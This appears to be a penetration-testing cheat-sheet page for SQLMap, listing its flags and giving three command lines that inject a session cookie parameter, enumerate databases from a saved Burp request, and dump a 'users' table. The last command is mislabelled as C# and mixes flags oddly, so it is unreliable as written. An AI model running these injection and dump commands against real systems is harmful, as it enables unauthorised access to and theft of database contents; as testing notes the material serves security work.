# SQLMap

## SQLmap

SQLMap example using :

* -r file &gt; \(burp request \)
* --data &gt; injection field
* -p &gt; parameter to inject
* --user-agent &gt; user-agent obfuscation
* --tamper script
* --dbs enumerate DBs
* --dbms &gt; db type
* --level 5  --risk 1
* --flush-session -&gt; clean up
* -v -&gt; verbose mode
* --threads -&gt; threads to run

```text
sqlmap -r login.req --data "PHPSESSID=78b00a1ac6a210982bc81f49f799e352"  -p PHPSESSID  --user-agent=mozilla --tamper htmlencode --dbs --dbms=Mysql --batch --level 5 --risk 1 --proxy http://localhost:8080 -v 6
```

### Using burp request

```text
sqlmap -r `pwd`/login.req  --dbs --batch --threads=10 -v4
```

### Retrieve tables from specific DB

```csharp
sqlmap -r `pwd`/login.req  --dbs --batch --threads=10 -v4 --dbms mssql -dbs --current-db shop --tables users --dump
```



